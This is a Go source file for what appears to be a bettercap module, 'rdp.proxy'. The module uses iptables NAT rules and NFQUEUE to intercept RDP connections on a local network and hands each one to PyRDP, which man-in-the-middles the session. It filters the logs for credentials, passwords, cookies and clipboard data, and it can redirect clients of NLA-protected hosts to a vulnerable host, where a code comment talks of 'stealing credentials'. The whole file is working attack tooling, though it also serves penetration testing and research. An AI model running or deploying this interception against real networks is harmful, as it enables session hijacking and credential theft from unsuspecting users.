package rdp_proxy

import (
    "bufio"
    "bytes"
    "fmt"
    "os/exec"
    "io"
    "io/ioutil"
    golog "log"
    "net"
    "regexp"
    "strings"
    "syscall"

    "github.com/bettercap/bettercap/core"
    "github.com/bettercap/bettercap/network"
    "github.com/bettercap/bettercap/session"

    "github.com/chifflier/nfqueue-go/nfqueue"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
)

type RdpProxy struct {
    session.SessionModule
    targets      []net.IP
    done         chan bool
    queue        *nfqueue.Queue
    queueNum     int
    port         int
    startPort    int
    cmd          string
    secCheck     string
    nlaMode      string
    redirectIP   net.IP
    redirectPort int
    regexp       string
    compiled     *regexp.Regexp
    active       map[string]exec.Cmd
}

var mod *RdpProxy

func NewRdpProxy(s *session.Session) *RdpProxy {
    mod = &RdpProxy{
        SessionModule: session.NewSessionModule("rdp.proxy", s),
        targets:       make([]net.IP, 0),
        done:          make(chan bool),
        queue:         nil,
        queueNum:      0,
        port:          3389,
        startPort:     40000,
        cmd:           "pyrdp-mitm.py",
        secCheck:      "",
        nlaMode:       "IGNORE",
        redirectIP:    make(net.IP, 0),
        redirectPort:  3389,
        regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)",
        active:        make(map[string]exec.Cmd),
    }

    mod.AddHandler(session.NewModuleHandler("rdp.proxy on", "", "Start the RDP proxy.",
        func(args []string) error {
            return mod.Start()
        }))

    mod.AddHandler(session.NewModuleHandler("rdp.proxy off", "", "Stop the RDP proxy.",
        func(args []string) error {
            return mod.Stop()
        }))

// Required parameters
mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num", "0", "NFQUEUE number to bind to."))
mod.AddParam(session.NewIntParameter("rdp.proxy.port", "3389", "RDP port to intercept."))
mod.AddParam(session.NewIntParameter("rdp.proxy.start", "40000", "Starting port for PyRDP sessions."))
mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py", "", "The PyRDP base command to launch the man-in-the-middle."))
mod.AddParam(session.NewStringParameter("rdp.proxy.out", "./", "", "The output directory for PyRDP artifacts."))
mod.AddParam(session.NewStringParameter("rdp.proxy.targets", session.ParamSubnet, "", "Comma separated list of IP addresses to proxy to, also supports nmap style IP ranges."))
mod.AddParam(session.NewStringParameter("rdp.proxy.regexp", "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)", "", "Print PyRDP logs matching this regular expression."))
// Optional paramaters
mod.AddParam(session.NewStringParameter("rdp.proxy.nla.seccheck", "", "", "Path to rdp-sec-check.pl. Allows more complex exploits when NLA is enforced (optional)."))
mod.AddParam(session.NewStringParameter("rdp.proxy.nla.mode", "IGNORE", "(IGNORE|RELAY|REDIRECT)", "Specify how to handle connections to a NLA-enabled host. Either IGNORE, RELAY or REDIRECT. Require rdp.proxy.nla.seccheck."))
mod.AddParam(session.NewStringParameter("rdp.proxy.nla.redirect.ip", "", "", "Specify IP to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT"))
mod.AddParam(session.NewIntParameter("rdp.proxy.nla.redirect.port", "3389", "Specify port to redirect clients that connects to NLA targets. Require rdp.proxy.nla.mode REDIRECT"))

    return mod
}

func (mod RdpProxy) Name() string {
    return "rdp.proxy"

}

func (mod RdpProxy) Description() string {
    return "A Linux-only module that relies on NFQUEUEs and PyRDP in order to man-in-the-middle RDP sessions."
}

func (mod RdpProxy) Author() string {
    return "Alexandre Beaulieu <alex@segfault.me> && Maxime Carbonneau <pourliver@gmail.com>"
}

func (mod *RdpProxy) isTarget(ip string) bool {
    for _, addr := range mod.targets {
        if addr.String() == ip {
            return true
        }
    }
    return false
}

func (mod *RdpProxy) isNLAEnforced(target string) (nla bool, err error) {
    if mod.secCheck == "" {
        return false, err
    }

    output, err := core.Exec(mod.secCheck, []string{
        target,
    })

    // Hybrid means enforce NLA + SSL
    if strings.Contains(output, "HYBRID_REQUIRED_BY_SERVER") {
        return true, err
    }

    return false, err
}

func (mod *RdpProxy) startProxyInstance(src string, sport string, dst string, dport string) (err error) {
    target := fmt.Sprintf("%s:%s", dst, dport)
    ips := fmt.Sprintf("[%s:%s -> %s:%s]", src, sport, dst, dport)

    // 3.1. Create a proxy agent and firewall rules.
    args := []string{
        "-l", fmt.Sprintf("%d", mod.startPort),
        // "-o", mod.outpath,
        // "-i", "-d"
        target,
    }

    //   3.2. Spawn PyRDP proxy instance
    cmd := exec.Command(mod.cmd, args...)
    stderrPipe, _ := cmd.StderrPipe()

    if err := cmd.Start(); err != nil {
        // Wont't handle things like "port already in use" since it happens at runtime
        mod.Error("PyRDP Start error : %v", err.Error())
        mod.Info("Failed to start PyRDP, won't intercept target %s", ips)

        return err
    }

    // Use goroutines to keep logging each instance of PyRDP
    go mod.filterLogs(ips, stderrPipe)

    mod.active[target] = *cmd
    return
}

// Filter PyRDP logs to only show those that matches mod.regexp
func (mod *RdpProxy) filterLogs(prefix string, output io.ReadCloser) {
    scanner := bufio.NewScanner(output)

    // For every log in the queue
    for scanner.Scan() {
        text := scanner.Bytes()
        if mod.compiled == nil || mod.compiled.Match(text) {
            // Extract the meaningful part of the log
            chunks := bytes.Split(text, []byte(" - "))

            // Get last element
            data := chunks[len(chunks) - 1]

            mod.Info("%s %s", prefix, data)
        }
    }
}

// Adds the firewall rule for proxy instance.
func (mod *RdpProxy) doProxy(dst string, proxyPort string) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-d", dst,
        "-p", "tcp",
        "--dport", fmt.Sprintf("%d", mod.port),
        "-j", "REDIRECT",
        "--to-ports", proxyPort,
    })
    return
}

func (mod *RdpProxy) doReturn(dst string, dport string) (err error) {
    _, err = core.Exec("iptables", []string{
        "-t", "nat",
        "-I", "BCAPRDP", "1",
        "-p", "tcp",
        "-d", dst,
        "--dport", dport,
        "-j", "RETURN",
    })
    return
}

func (mod *RdpProxy) configureFirewall(enable bool) (err error) {
    rules := [][]string{}

    if enable {
        rules = [][]string{
            { "-t", "nat", "-N", "BCAPRDP" },
            { "-t", "nat", "-I", "PREROUTING", "1", "-j", "BCAPRDP" },
            { "-t", "nat", "-A", "BCAPRDP",
                "-p", "tcp", "-m", "tcp", "--dport", fmt.Sprintf("%d", mod.port),
                "-j", "NFQUEUE", "--queue-num", fmt.Sprintf("%d", mod.queueNum), "--queue-bypass",
            },
        }

    } else if !enable {
        rules = [][]string{
            { "-t", "nat", "-D", "PREROUTING", "-j", "BCAPRDP" },
            { "-t", "nat", "-F", "BCAPRDP" },
            { "-t", "nat", "-X", "BCAPRDP" },
        }
    }

    for _, rule := range rules {
        if _, err = core.Exec("iptables", rule); err != nil {
            return err
        }
    }
    return
}

// Fixes a bug that may come up when interrupting the application too quickly.
func (mod *RdpProxy) repairFirewall() (err error) {
    rules := [][]string{
        { "-t", "nat", "-F", "BCAPRDP" },
        { "-t", "nat", "-X", "BCAPRDP" },
    }

    for _, rule := range rules {
        if _, err = core.Exec("iptables", rule); err != nil {
            return err
        }
    }
    return
}

func (mod *RdpProxy) Configure() (err error) {
    var targets string

    golog.SetOutput(ioutil.Discard)
    mod.destroyQueue()

    // TODO: Param validation and hydration
    if err, mod.port = mod.IntParam("rdp.proxy.port"); err != nil {
        return
    } else if err, mod.cmd = mod.StringParam("rdp.proxy.command"); err != nil {
        return
    } else if err, mod.queueNum = mod.IntParam("rdp.proxy.queue.num"); err != nil {
        return
    } else if err, targets = mod.StringParam("rdp.proxy.targets"); err != nil {
        return
    } else if mod.targets, _, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
        return
    } else if err, mod.regexp = mod.StringParam("rdp.proxy.regexp"); err != nil {
        return
    } else if err, mod.secCheck = mod.StringParam("rdp.proxy.nla.seccheck"); err != nil {
        return
    } else if err, mod.nlaMode = mod.StringParam("rdp.proxy.nla.mode"); err != nil {
        return
    } else if mod.nlaMode == "RELAY" {
        mod.Info("Mode RELAY is unimplemented yet, fallbacking to mode IGNORE.")
        mod.nlaMode = "IGNORE"
        } else if err, mod.redirectIP = mod.IPParam("rdp.proxy.nla.redirect.ip"); err != nil {
        return
    } else if err, mod.redirectPort = mod.IntParam("rdp.proxy.nla.redirect.port"); err != nil {
        return
    } else if mod.regexp != "" {
        if mod.compiled, err = regexp.Compile(mod.regexp); err != nil {
            return
        }
    } else if mod.secCheck != "" {
        if _, err = exec.LookPath(mod.secCheck); err != nil {
            return
        }
    } else if _, err = exec.LookPath(mod.cmd); err != nil {
        return
    }

    mod.Info("Starting RDP Proxy")
    mod.Debug("Targets=%v", mod.targets)

    // Create the NFQUEUE handler.
    mod.queue = new(nfqueue.Queue)
    if err = mod.queue.SetCallback(OnRDPConnection); err != nil {
        return
    } else if err = mod.queue.Init(); err != nil {
        return
    } else if err = mod.queue.Unbind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.Bind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.CreateQueue(mod.queueNum); err != nil {
        return
    } else if err = mod.queue.SetMode(nfqueue.NFQNL_COPY_PACKET); err != nil {
        return
    } else if err = mod.configureFirewall(true); err != nil {
        // Attempt to repair firewall, then retry once
        mod.repairFirewall()
        if err = mod.configureFirewall(true); err != nil {
            return
        }
    }
    return nil
}

// Note: It is probably a good idea to verify whether this call is serialized.
func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
    // 1. Determine source and target addresses.
    p := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
    src, sport := p.NetworkLayer().NetworkFlow().Src().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Src())
    dst, dport := p.NetworkLayer().NetworkFlow().Dst().String(), fmt.Sprintf("%s", p.TransportLayer().TransportFlow().Dst())

    // TODO : Log everything inside the events stream
    ips := fmt.Sprintf("[%s:%s -> %s:%s]", src, sport, dst, dport)

    if mod.isTarget(dst) {
        target := fmt.Sprintf("%s:%s", dst, dport)

        // 2. Check if the destination IP already has a PyRDP session active, if so, do nothing.
        if _, ok :=  mod.active[target]; !ok {
            targetNLA, _ := mod.isNLAEnforced(target)

            // Only if seccheck is set
            if targetNLA {
                switch mod.nlaMode {
                case "REDIRECT":
                    // TODO : Find a way to disconnect user right after stealing credentials.
                    // Start a PyRDP instance to the preconfigured vulnerable host
                    // and forward packets to the target to this host instead
                    mod.Info("%s Target has NLA enabled and mode REDIRECT, forwarding to the vulnerable host...", ips)
                    err := mod.startProxyInstance(src, sport, mod.redirectIP.String(), fmt.Sprintf("%d", mod.redirectPort))

                    if err != nil {
                        // Add an exception in the firewall to avoid intercepting packets to this destination and port
                        mod.doReturn(dst, dport)
                        payload.SetVerdict(nfqueue.NF_DROP)

                        return 0
                    }

                    mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
                    mod.startPort += 1
                default:
                    // Add an exception in the firewall to avoid intercepting packets to this destination and port
                    mod.Info("%s Target has NLA enabled and mode IGNORE, won't intercept", ips)

                    mod.doReturn(dst, dport)
                }
            } else {
                // Starts a PyRDP instance.
                // Won't work if the target has NLA but rdp-sec-check isn't set
                err := mod.startProxyInstance(src, sport, dst, dport)

                if err != nil {
                    // Add an exception in the firewall to avoid intercepting packets to this destination and port
                    mod.doReturn(dst, dport)
                    payload.SetVerdict(nfqueue.NF_DROP)

                    return 0
                }

                // Add a NAT rule in the firewall for this particular target IP
                mod.doProxy(dst, fmt.Sprintf("%d", mod.startPort))
                mod.startPort += 1
            }
        }
    } else {
        mod.Info("Non-target, won't intercept %s", ips)

        // Add an exception in the firewall to avoid intercepting packets to this destination and port
        mod.doReturn(dst, dport)
    }

    // Force a retransmit to trigger the new firewall rules. (TODO: Find a more efficient way to do this.)
    payload.SetVerdict(nfqueue.NF_DROP)

    return 0
}

// NFQUEUE needs a raw function.
func OnRDPConnection(payload *nfqueue.Payload) int {
    return mod.handleRdpConnection(payload)
}

func (mod *RdpProxy) Start() error {
    if mod.Running() {
        return session.ErrAlreadyStarted(mod.Name())
    } else if err := mod.Configure(); err != nil {
        return err
    }

    return mod.SetRunning(true, func() {
        mod.Info("started on queue number %d", mod.queueNum)

        defer mod.destroyQueue()

        mod.queue.Loop()

        mod.done <- true
    })
}

func (mod *RdpProxy) Stop() error {
    return mod.SetRunning(false, func() {
        mod.queue.StopLoop()
        mod.configureFirewall(false)
        for _, cmd := range mod.active {
            cmd.Process.Kill() // FIXME: More graceful way to shutdown proxy agents?
        }

        <-mod.done
    })
}

func (mod *RdpProxy) destroyQueue() {
    if mod.queue == nil {
        return
    }

    mod.queue.DestroyQueue()
    mod.queue.Close()
    mod.queue = nil
}
